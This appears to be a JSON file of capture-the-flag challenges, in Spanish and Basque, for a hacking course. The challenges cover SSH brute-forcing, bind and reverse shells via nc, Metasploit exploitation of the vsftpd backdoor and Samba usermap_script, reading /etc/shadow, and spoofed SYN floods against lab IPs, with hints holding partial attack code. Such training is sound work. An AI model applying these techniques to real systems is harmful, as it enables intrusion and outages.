+        "Enunciado del reto": "Ha llegado el tiempo de la acci\u00f3n. Tenemos una radiograf\u00eda de la organizaci\u00f3n. \u00bfSer\u00e1s capaz de tomar y comprometer alg\u00fan dispositivo?\n\nEn primer lugar, utilizaremos el popular servicio de ssh para controlar remotamente la m\u00e1quina 192.168.1.200 . Sabemos que en esa IP el puerto 22 est\u00e1 abierto, por lo que es posible que el servicio ssh est\u00e9 en funcionamiento... Adem\u00e1s, tenemos una lista de usuarios de esa m\u00e1quina. Pero, \u00bfnos basta con esa informaci\u00f3n?",
+        "hitos": [
+            {
+                "Nombre del hito": "Er1-UD3-Mug1",
+                "Puntos": 18,
+                "Enunciado del hito": "Utiliza el script \"Er1_UD3_SSH_Bat.py\" y el fichero \"diccionario\".  \n\u00bfCu\u00e1l es la contrase\u00f1a del usuario \"user\" para entrar a la m\u00e1quina con IP 192.168.1.200 mediante ssh (puerto 22)?"
+            },
+            {
+                "Nombre del hito": "Er1-UD3-Mug2",
+                "Puntos": 22,
+                "Enunciado del hito": "Utiliza el script  \"Er1_UD3_SSH_Bi.py\". Usa las credenciales obtenidas en el anterior hito. \nMuestra por pantalla el contenido del fichero /etc/group de la m\u00e1quina 192.168.1.200. \u00bfQu\u00e9 usuario hay dentro del grupo \"adm\" ? \nEJEMPLO: \n\nssl-cert:x:114:postgres\n\nDentro del grupo ssl-cert est\u00e1 el usuario postgres. \n"
+            }
+        ],
+        "pistas": [
+            {
+                "Nombre de la pista": "Er1-UD3-Mug1-Pista 2",
+                "Puntos": 3,
+                "Enunciado de la pista": "objeto_ssh.solicitar_datos_usuario()\n.......\nwhile (contrase\u00f1a_ssh and not encontrada):"
+            },
+            {
+                "Nombre de la pista": "Er1-UD3-Mug1-Pista1",
+                "Puntos": 1,
+                "Enunciado de la pista": "    objeto_ssh=ssh()\n"
+            },
+            {
+                "Nombre de la pista": "Er1-UD3-Mug1-Pista3",
+                "Puntos": 6,
+                "Enunciado de la pista": ".............\n        print('[-] Intento ' + str(contador_contrase\u00f1as) + ': ' + str(contrase\u00f1a_ssh) + ' ...', end='')\n        objeto_ssh.password=contrase\u00f1a_ssh\n        encontrada = objeto_ssh.conectar_ssh()\n.............."
+            },
+            {
+                "Nombre de la pista": "Er1-UD3-Mug2-Pista 1",
+                "Puntos": 1,
+                "Enunciado de la pista": "from Er1_UD3_SSH_Bat_Soluzioa import ssh"
+            },
+            {
+                "Nombre de la pista": " Er1-UD3-Mug2-Pista2",
+                "Puntos": 3,
+                "Enunciado de la pista": "        objeto_ssh=ssh()\n        conexion_establecida=False\n"
+            },
+            {
+                "Nombre de la pista": "Er1-UD3-Mug2-Pista3",
+                "Puntos": 4,
+                "Enunciado de la pista": "  while not conexion_establecida: \n            ..........\n            conexion_establecida=objeto_ssh.conectar_ssh()\n"
+            },
+            {
+                "Nombre de la pista": "Er1-UD3-Mug2-Pista4",
+                "Puntos": 4,
+                "Enunciado de la pista": " ejecuta_exit=False  \n       while not ejecuta_exit:\n...........................................\n                    \nif comando.strip().lower() == 'exit':\n       ejecuta_exit=True"
+            }
+        ]
+    },
+    {
+        "Nombre del reto": "Er2-UD3-Shell",
+        "Enunciado del reto": "Cuando tomamos el control de una m\u00e1quina a trav\u00e9s de ssh, el ruido generado suele ser notable (el tr\u00e1fico es muy conocido). Por ello, puede ser interesante utilizar otras t\u00e9cnicas m\u00e1s silenciosas...",
+        "hitos": [
+            {
+                "Nombre del hito": "Er2-UD3-Mug1",
+                "Puntos": 10,
+                "Enunciado del hito": "Bind Shell bat erabiliko duzu 192.168.1.150 IPdun makinan konektatzeko. Horretarako, erabili ezazu Er2_UD2_Shell_Bat_Soluzioa.py scripta. \n\nAriketa honetan biktima zein erasotzailearen papera hartuko duzu. \n\nERASOTZAILEA (kali)\nFitxategia 192.168.1.150 makinara bidaliko duzu; kasu honetan, ssh bidez. \nscp [fitxategia] root@192.168.1.150:/root\n\nBIKTIMA: (dnsserver) --> ssh bidez konektatu bertara\nFitxategi bat jaso duzu py luzapenarekin. Exekutatzea erabaki duzu ikusteko zer egiten duen; exekutatu ta gero, konturatu zara ez duela ezer egiten. \n\n ERASOTZAILEA\nErabili nc komandoa BIND Shell-a zabaltzeko. \n\nZein da biktimaren /proc/meminfo fitxategiaren Hugepagesize parametroaren balioa KBetan?"
+            },
+            {
+                "Nombre del hito": "Er2-UD3-Mug2",
+                "Puntos": 10,
+                "Enunciado del hito": "Reverse Shell bat erabiliko duzu 192.168.1.150 IPdun makinan konektatzeko. Horretarako, erabili ezazu Er2_UD2_Shell_Bi_Soluzioa.py scripta. \n\nAriketa honetan biktima zein erasotzailearen papera hartuko duzu. \n\nERASOTZAILEA (kali)\nFitxategia 192.168.1.150 makinara bidaliko duzu; kasu honetan, ssh bidez. \nscp [fitxategia] root@192.168.1.150:/root\nGainera, listener-a martxan jarriko duzu, nc erabiliz. \n\nBIKTIMA: (dnsserver) --> ssh bidez konektatu bertara\nFitxategi bat jaso duzu py luzapenarekin. Exekutatzea erabaki duzu ikusteko zer egiten duen. \n\n ERASOTZAILEA\nBaduzu shell-a irekita. \n\nZein da biktimaren /proc/cpuinfo fitxategiaren vendor_id parametroaren balioa?"
+            }
+        ],
+        "pistas": []
+    },
+    {
+        "Nombre del reto": "Er3-UD3-FTP",
+        "Enunciado del reto": "Como has visto en las pruebas realizadas en la fase anterior, la m\u00e1quina con IP 192.168.1.200 tiene acceso al servicio FTP, donde utiliza software VSFTPD.\nAl leer ese acr\u00f3nimo, tus ojos han brillado .",
+        "hitos": [
+            {
+                "Nombre del hito": "Er3-UD3-Mug1",
+                "Puntos": 15,
+                "Enunciado del hito": "Cu\u00e1les son los 4 \u00faltimos caracteres de la contrase\u00f1a encriptada del usuario \"klog\" en el fichero /etc/shadow?"
+            }
+        ],
+        "pistas": [
+            {
+                "Nombre de la pista": "Er3-UD3-Mug1-Pista1",
+                "Puntos": 1,
+                "Enunciado de la pista": "\u00bfEn qu\u00e9 puerto se abre la \"backdoor\"?\n62xx"
+            },
+            {
+                "Nombre de la pista": "Er3-UD3-Mug1-Pista2",
+                "Puntos": 2,
+                "Enunciado de la pista": "if comando.lower()==\"exit\":\n                ejecuta_exit=True"
+            },
+            {
+                "Nombre de la pista": "Er3-UD3-Mug1-Pista 2",
+                "Puntos": 5,
+                "Enunciado de la pista": "puerta_trasera_socket.send(comando)\ndestino,puerto=xxxxx\nlanzar_exploit(?????, ?????)"
+            }
+        ]
+    },
+    {
+        "Nombre del reto": "Er4-UD3-Metasploit",
+        "Enunciado del reto": "No podemos dar por terminada esta fase sin utilizar Metasploit Framework...",
+        "hitos": [
+            {
+                "Nombre del hito": "Er4-UD3-Mug1",
+                "Puntos": 11,
+                "Enunciado del hito": "Realiza la explotaci\u00f3n de la m\u00e1quina 192.168.1.200 contra VSFTPD para tomar su control.\n\u00bfCu\u00e1l es el valor del par\u00e1metro MemTotal del fichero /proc/meminfo de la m\u00e1quina con IP 192.168.1.200 en kB?"
+            },
+            {
+                "Nombre del hito": "Er4-UD3-Mug2",
+                "Puntos": 14,
+                "Enunciado del hito": "\nRealiza la explotaci\u00f3n anti-\" Samba usermap script \"de la m\u00e1quina 192.168.1.200 para tomar su control.\n\u00bfQu\u00e9 payload puedes usar? Es similar al hito anterior, pero no igual. Anal\u00edzalo jugando con el c\u00f3digo: imprime los payloads opcionales de \"exploit\".\n\u00bfCu\u00e1l es el valor del tama\u00f1o de la cach\u00e9 del fichero /proc/cpuinfo en la IP 192.168.1.200?\n"
+            }
+        ],
+        "pistas": [
+            {
+                "Nombre de la pista": "Er4-UD3-Orokor1",
+                "Puntos": 2,
+                "Enunciado de la pista": "        ip,puerto_rpc,contrasena=solicitar_datos_usuario()\n"
+            },
+            {
+                "Nombre de la pista": "Er4-Ud3-Orokor2",
+                "Puntos": 2,
+                "Enunciado de la pista": "cliente_rpc = MsfRpcClient(contrasena, port=int(puerto_rpc))"
+            },
+            {
+                "Nombre de la pista": "Er4-Ud3-Orokor3",
+                "Puntos": 2,
+                "Enunciado de la pista": "   exploit = cliente_rpc.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')\nEDO\n    exploit=cliente_rpc.modules.use('exploit', 'multi/samba/usermap_script')"
+            },
+            {
+                "Nombre de la pista": "Er4-Ud3-Orokor4",
+                "Puntos": 4,
+                "Enunciado de la pista": " output = sesion.read()\n                    print(output)"
+            },
+            {
+                "Nombre de la pista": "Er4-UD3-2mugarria",
+                "Puntos": 4,
+                "Enunciado de la pista": "print (exploit.payloads)"
+            }
+        ]
+    },
+    {
+        "Nombre del reto": "Er1-UD4-Trafikoa",
+        "Enunciado del reto": "Hemos logrado explotar las vulnerabilidades de algunas m\u00e1quinas, y ahora es el momento de realizar acciones de toda \u00edndole posteriores a la explotaci\u00f3n.\nPara empezar, te has encontrado con un archivo pcap. \u00bfSe puede conseguir informaci\u00f3n interesante a partir de \u00e9l?",
+        "hitos": [
+            {
+                "Nombre del hito": "Er1-UD4-Mug1",
+                "Puntos": 15,
+                "Enunciado del hito": "A qu\u00e9 hora recibimos el primer paquete ICMP hacia la m\u00e1quina Kali desde la IP 192.168.1.150?\nUtiliza el script Er1_UD4_Trafikoa_Bat.py. \nFORMATO DE LA RESPUESTA: hh:mm:ss"
+            },
+            {
+                "Nombre del hito": "Er1-UD4-Mug2",
+                "Puntos": 15,
+                "Enunciado del hito": "Imprime por pantalla los paquetes hacia el puerto 80 de la IP 45.33.32.156. \n\u00bfCu\u00e1l es la longitud del paquete n\u00famero 511?\nUtiliza el script Er1_UD4_Trafikoa_Bi.py."
+            },
+            {
+                "Nombre del hito": "Er1-UD4-Mug3",
+                "Puntos": 20,
+                "Enunciado del hito": "Inprimatu pantailan kali makinatik 22 atakaranzko paketeak. \nZein da  430 zenbakidun paketearen helburu-IPa?\nUtiliza el script Er1_UD4_Trafikoa_Hiru.py. "
+            }
+        ],
+        "pistas": [
+            {
+                "Nombre de la pista": "Er1-UD4-Mug1-Pista1",
+                "Puntos": 3,
+                "Enunciado de la pista": "    conversaciones = []\n       #Iteramos por cada elemento de la captura\n       for paquete in captura:"
+            },
+            {
+                "Nombre de la pista": "Er1-UD4-Mug1-Pista2",
+                "Puntos": 6,
+                "Enunciado de la pista": "   resultado = conversacion_red(???????)\n              #Si el string \"resultado\" no est\u00e1 vac\u00edo\n              if resultado is not None:\n                 #A\u00f1adimos el string a la lista \"conversaciones\"\n                 conversaciones.append(???????)"
+            },
+            {
+                "Nombre de la pista": "Er1-UD4-Mug2-Pista 1",
+                "Puntos": 3,
+                "Enunciado de la pista": "      captura = pyshark.FileCapture(ruta_fichero)\n      conversaciones = []"
+            },
+            {
+                "Nombre de la pista": "Er1-UD4-Mug2-Pista2",
+                "Puntos": 6,
+                "Enunciado de la pista": "              if direccion_ip==paquete.ip.dst and int(puerto_usuario)==int(paquete[\"TCP\"].dstport):\n                     resultado=conversacion_red(??????)\n                    conversaciones.append(???????) \n"
+            },
+            {
+                "Nombre de la pista": "Er1-UD4-Mug3-Pista1",
+                "Puntos": 5,
+                "Enunciado de la pista": "En \"main\":\ncaptura = rdpcap(????)\nanalizar_paquetes(xxx,yyyy,zzzz)"
+            },
+            {
+                "Nombre de la pista": " Er1-UD4-Mug3-Pista2",
+                "Puntos": 7,
+                "Enunciado de la pista": "if ip.src == ip_src and tcp.dport == int(puerto_dst):\n                fecha_hora = paquete.????\n                fecha_hora_str = time.strftime(\"%d-%m-%Y %H:%M:%S\", time.localtime(int(fecha_hora)))\n                destino=ip.????"
+            }
+        ]
+    },
+    {
+        "Nombre del reto": "Er2-UD4-Egonkortu",
+        "Enunciado del reto": "En la fase anterior lanzamos una \"BIND Shell\", pero el Promt de la shell obtenida no se actualizaba. \u00bfConseguir\u00e1s que el Prompt cambie seg\u00fan el directorio en el que nos hallemos?",
+        "hitos": [
+            {
+                "Nombre del hito": "Er2-UD4-Mug1",
+                "Puntos": 10,
+                "Enunciado del hito": "Obt\u00e9n el control de la m\u00e1quina mediante un Bind Shell baten bidez. \n\u00bfQu\u00e9 cadena de caracteres se ve en el prompt despu\u00e9s de ejecutar el comando \"cd ..\"?\nEJEMPLO DE LA RESPUESTA: (\u00a1no escribas el car\u00e1cter \"#\"!)\nroot@webserver:/home\n\nNota: \u00a1No escribas el car\u00e1cter \"#\"!"
+            }
+        ],
+        "pistas": [
+            {
+                "Nombre de la pista": "Er2-UD4-Mug1-Pista1",
+                "Puntos": 7,
+                "Enunciado de la pista": "pty.spawn(\"/bin/bash\")"
+            }
+        ]
+    },
+    {
+        "Nombre del reto": "Er3-UD4-DOS",
+        "Enunciado del reto": "En la IP 192.168.1.200 tenemos accesible un sitio web orri bat dugu martxan. Segurtatua egongo al da DOS erasoen kontra?",
+        "hitos": [
+            {
+                "Nombre del hito": "Er3-UD4-Mug1",
+                "Puntos": 15,
+                "Enunciado del hito": "Exekutatu DOS eraso bat 192.168.1.200 IPko 80 atakaren kontra. \nErabili Er3_UD4_DOS_Bat.py scripta. \nBegiratu trafikoa WireShark-en.\nOrdenatu atalak esaldi zuzen gehien duenetik gutxien duenera: \n\na)  Web guneak atzigarri egoteari utzi dio; SYN pakete guztien jatorrizko IPa Kalirena da. Pakete guztien luzera 0 baino handiagoa da. . \nb)  Web guneak atzigarri jarraitzen du etengabe; SYN paketeen jatorrizko IPak aldakorrak dira. Paketeen luzera 0 baino handiagoa da. \nc)  Web guneak atzigarri egoteari utzi dio; SYN pakete guztien jatorrizko IPa berbera da, baina ez Kalirena. Paketeen luzera 0 da. \nd)  Web guneak atzigarri egoteari utzi dio; SYN paketeen jatorrizko IPak aldakorrak dira. Paketeen luzera 0 da. \n\nEmaitzaren formatua: abcd"
+            },
+            {
+                "Nombre del hito": "Er3-UD4-Mug2",
+                "Puntos": 25,
+                "Enunciado del hito": "Exekutatu DOS eraso bat 192.168.1.200 IPko 80 atakaren kontra. \nErabili Er3_UD4_DOS_Bi.py scripta. \nBegiratu trafikoa WireShark-en.\nOrdenatu atalak esaldi zuzen gehien duenetik gutxien duenera: \n\na)  Web guneak atzigarri egoteari utzi dio; SYN pakete guztien jatorrizko IPa Kalirena da. Pakete guztien luzera 0 baino handiagoa da. \nb)  Web guneak atzigarri jarraitzen du etengabe; SYN paketeen jatorrizko IPa berbera da. Paketeen luzera 0 baino handiagoa da. \nc)  Web guneak atzigarri egoteari utzi dio; SYN pakete guztien jatorrizko IPa berbera da, baina ez Kalirena. Paketeen luzera 0 da. \nd)  Web guneak atzigarri egoteari utzi dio; SYN paketeen jatorrizko IPak aldakorrak dira. Paketeen luzera 0 da. "
+            }
+        ],
+        "pistas": [
+            {
+                "Nombre de la pista": "Er3-UD4-Mug1-Pista1",
+                "Puntos": 1,
+                "Enunciado de la pista": "       p,puerto_rpc,contrasena=solicitar_datos_usuario()\n"
+            },
+            {
+                "Nombre de la pista": "Er3-UD4-Mug1-Pista2",
+                "Puntos": 5,
+                "Enunciado de la pista": "cliente_rpc = MsfRpcClient(contrasena, port=int(puerto_rpc)) \nexploit = cliente_rpc.modules.use('auxiliary', 'dos/tcp/synflood')"
+            },
+            {
+                "Nombre de la pista": "Er3-UD4-Mug1-Pista3",
+                "Puntos": 3,
+                "Enunciado de la pista": "        exploit.execute()\n        time.sleep(2)\n        print(\"Se est\u00e1 efectuando el SYN Flood\")\n        input(\"Pulsa una tecla para detenerlo\")\n        cliente_rpc.logout()"
+            },
+            {
+                "Nombre de la pista": "Er3-UD4-Mug2-Pista3",
+                "Puntos": 6,
+                "Enunciado de la pista": "        paquete_TCP.sport = puerto_origen\n        paquete_TCP.dport = puerto_destino\n        paquete_TCP.flags = \"S\"\n        paquete_TCP.seq = secuencia\n        paquete_TCP.window = win"
+            },
+            {
+                "Nombre de la pista": "Er3-UD4-Mug2-Pista2",
+                "Puntos": 3,
+                "Enunciado de la pista": "paquete_IP.src = obtener_IP_aleatoria()\n        paquete_IP.dst = ip_destino"
+            },
+            {
+                "Nombre de la pista": "Er3-UD4-Mug2-Pista1",
+                "Puntos": 3,
+                "Enunciado de la pista": "       puerto_origen = obtener_entero_aleatorio()\n        secuencia= obtener_entero_aleatorio()\n        win = obtener_entero_aleatorio()"
+            },
+            {
+                "Nombre de la pista": "Er3-UD4-Mug2-Pista4",
+                "Puntos": 3,
+                "Enunciado de la pista": "  ip_usuario,puerto_usuario=solicitar_datos_usuario()\n  numero_paquetes = input (\"\u00bfCu\u00e1ntos paquetes quieres enviar?: \")\n  print(\"Se est\u00e1 efectuando el SYN Flood\")\n  SYN_Flood(ip_usuario, int(puerto_usuario),int(numero_paquetes))   "
+            }
+        ]
+    }
+]
